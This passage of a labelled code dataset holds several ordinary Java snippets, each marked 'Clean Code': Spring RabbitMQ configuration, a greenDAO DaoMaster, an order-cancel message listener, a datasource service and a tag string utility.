 * @return the evaluation, or {@code null} if the evaluation for that phase has not been recorded yet
 */
  @Nullable public ConditionEvaluation getConditionEvaluation(  ConfigurationPhase phase){
    return this.recordedEvaluations.get(phase);
  }
}
",0,Clean Code
"/** 
 * @auther macrozheng
 * @description 路由模式消息队列配置
 * @date 2020/5/19
 * @github https://github.com/macrozheng
 */
@Configuration public class DirectRabbitConfig {
  @Bean public DirectExchange direct(){
    return new DirectExchange(""exchange.direct"");
  }
  @Bean public Queue directQueue1(){
    return new AnonymousQueue();
  }
  @Bean public Queue directQueue2(){
    return new AnonymousQueue();
  }
  @Bean public Binding directBinding1a(  DirectExchange direct,  Queue directQueue1){
    return BindingBuilder.bind(directQueue1).to(direct).with(""orange"");
  }
  @Bean public Binding directBinding2a(  DirectExchange direct,  Queue directQueue2){
    return BindingBuilder.bind(directQueue2).to(direct).with(""green"");
  }
  @Bean public Binding directBinding2b(  DirectExchange direct,  Queue directQueue2){
    return BindingBuilder.bind(directQueue2).to(direct).with(""black"");
  }
  @Bean public DirectReceiver receiver(){
    return new DirectReceiver();
  }
  @Bean public DirectSender directSender(){
    return new DirectSender();
  }
}
",0,Clean Code
"/** 
 * Master of DAO (schema version 5): knows all DAOs.
 */
public class DaoMaster extends AbstractDaoMaster {
  public static final int SCHEMA_VERSION=5;
  /** 
 * Creates underlying database table using DAOs. 
 */
  public static void createAllTables(  Database db,  boolean ifNotExists){
    RecordCaseInfoDao.createTable(db,ifNotExists);
  }
  /** 
 * Drops underlying database table using DAOs. 
 */
  public static void dropAllTables(  Database db,  boolean ifExists){
    RecordCaseInfoDao.dropTable(db,ifExists);
  }
  /** 
 * WARNING: Drops all table on Upgrade! Use only during development. Convenience method using a  {@link DevOpenHelper}.
 */
  public static DaoSession newDevSession(  Context context,  String name){
    Database db=new DevOpenHelper(context,name).getWritableDb();
    DaoMaster daoMaster=new DaoMaster(db);
    return daoMaster.newSession();
  }
  public DaoMaster(  SQLiteDatabase db){
    this(new StandardDatabase(db));
  }
  public DaoMaster(  Database db){
    super(db,SCHEMA_VERSION);
    registerDaoClass(RecordCaseInfoDao.class);
  }
  public DaoSession newSession(){
    return new DaoSession(db,IdentityScopeType.Session,daoConfigMap);
  }
  public DaoSession newSession(  IdentityScopeType type){
    return new DaoSession(db,type,daoConfigMap);
  }
  /** 
 * Calls  {@link #createAllTables(Database,boolean)} in {@link #onCreate(Database)} -
 */
public static abstract class OpenHelper extends DatabaseOpenHelper {
    public OpenHelper(    Context context,    String name){
      super(context,name,SCHEMA_VERSION);
    }
    public OpenHelper(    Context context,    String name,    CursorFactory factory){
      super(context,name,factory,SCHEMA_VERSION);
    }
    @Override public void onCreate(    Database db){
      Log.i(""greenDAO"",""Creating tables for schema version "" + SCHEMA_VERSION);
      createAllTables(db,false);
    }
  }
  /** 
 * WARNING: Drops all table on Upgrade! Use only during development. 
 */
public static class DevOpenHelper extends OpenHelper {
    public DevOpenHelper(    Context context,    String name){
      super(context,name);
    }
    public DevOpenHelper(    Context context,    String name,    CursorFactory factory){
      super(context,name,factory);
    }
    @Override public void onUpgrade(    Database db,    int oldVersion,    int newVersion){
      Log.i(""greenDAO"",""Upgrading schema from version "" + oldVersion + "" to ""+ newVersion+ "" by dropping all tables"");
      dropAllTables(db,true);
      onCreate(db);
    }
  }
}",0,Clean Code
"/** 
 * @auther macrozheng
 * @description 取消订单消息的处理者
 * @date 2018/9/14
 * @github https://github.com/macrozheng
 */
@Component @RabbitListener(queues=""mall.order.cancel"") public class CancelOrderReceiver {
  private static Logger LOGGER=LoggerFactory.getLogger(CancelOrderReceiver.class);
  @Autowired private OmsPortalOrderService portalOrderService;
  @RabbitHandler public void handle(  Long orderId){
    LOGGER.info(""receive delay message orderId:{}"",orderId);
    portalOrderService.cancelOrder(orderId);
  }
}
/** 
 * @auther macrozheng
 * @description 取消订单消息的处理者
 * @date 2018/9/14
 * @github https://github.com/macrozheng
 */
@Component @RabbitListener(queues=""mall.order.cancel"") public class CancelOrderReceiver {
  private static Logger LOGGER=LoggerFactory.getLogger(CancelOrderReceiver.class);
  @Autowired private OmsPortalOrderService portalOrderService;
  @RabbitHandler public void handle(  Long orderId){
    LOGGER.info(""receive delay message orderId:{}"",orderId);
    portalOrderService.cancelOrder(orderId);
  }
}
/** 
 * @auther macrozheng
 * @description 取消订单消息的接收者
 * @date 2018/9/14
 * @github https://github.com/macrozheng
 */
@Component @RabbitListener(queues=""mall.order.cancel"") public class CancelOrderReceiver {
  private static Logger LOGGER=LoggerFactory.getLogger(CancelOrderReceiver.class);
  @Autowired private OmsPortalOrderService portalOrderService;
  @RabbitHandler public void handle(  Long orderId){
    LOGGER.info(""receive delay message orderId:{}"",orderId);
    portalOrderService.cancelOrder(orderId);
  }
}
",0,Clean Code
"/** 
 * Created by jingwk on 2020/01/30
 */
@Service @Transactional(readOnly=true) public class JobDatasourceServiceImpl extends ServiceImpl<JobDatasourceMapper,JobDatasource> implements JobDatasourceService {
  @Resource private JobDatasourceMapper datasourceMapper;
  @Override public Boolean dataSourceTest(  JobDatasource jobDatasource) throws IOException {
    if (JdbcConstants.HBASE.equals(jobDatasource.getDatasource())) {
      return new HBaseQueryTool(jobDatasource).dataSourceTest();
    }
    String userName=AESUtil.decrypt(jobDatasource.getJdbcUsername());
    if (userName == null) {
      jobDatasource.setJdbcUsername(AESUtil.encrypt(jobDatasource.getJdbcUsername()));
    }
    String pwd=AESUtil.decrypt(jobDatasource.getJdbcPassword());
    if (pwd == null) {
      jobDatasource.setJdbcPassword(AESUtil.encrypt(jobDatasource.getJdbcPassword()));
    }
    if (JdbcConstants.MONGODB.equals(jobDatasource.getDatasource())) {
      return new MongoDBQueryTool(jobDatasource).dataSourceTest(jobDatasource.getDatabaseName());
    }
    BaseQueryTool queryTool=QueryToolFactory.getByDbType(jobDatasource);
    return queryTool.dataSourceTest();
  }
  @Override public int update(  JobDatasource datasource){
    return datasourceMapper.update(datasource);
  }
  @Override public List<JobDatasource> selectAllDatasource(){
    return datasourceMapper.selectList(null);
  }
}
",0,Clean Code
"public final class TagStringIOExt {
  public static @NotNull String writeTag(  @NotNull BinaryTag tag){
    return writeTag(tag,"""");
  }
  public static @NotNull String writeTag(  @NotNull BinaryTag input,  @NotNull String indent){
    final StringBuilder sb=new StringBuilder();
    try (final TagStringWriter emit=new TagStringWriter(sb,indent)){
      emit.writeTag(input);
    }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
    return sb.toString();
  }
  public static @NotNull BinaryTag readTag(  @NotNull String input) throws IOException {
    try {
      final CharBuffer buffer=new CharBuffer(input);
      final TagStringReader parser=new TagStringReader(buffer);
      final BinaryTag tag=parser.tag();
      if (buffer.skipWhitespace().hasMore()) {
        throw new IOException(""Document had trailing content after first tag"");
      }
      return tag;
    }
 catch (    final StringTagParseException ex) {
      throw new IOException(ex);
    }
  }
  /** 
 * Reads a tag and returns the remainder of the input buffer.
 */
  public static Map.Entry<@NotNull BinaryTag,@NotNull String> readTagEmbedded(  @NotNull String input) throws IOException {
    try {
      final CharBuffer buffer=new CharBuffer(input);
      final TagStringReader parser=new TagStringReader(buffer);
      final BinaryTag tag=parser.tag();
      final StringBuilder remainder=new StringBuilder();
      while (buffer.hasMore()) {
        remainder.append(buffer.take());
      }
      return Map.entry(tag,remainder.toString());
    }
 catch (    final StringTagParseException ex) {
      throw new IOException(ex);
    }
  }
  private TagStringIOExt(){
  }
}
",0,Clean Code
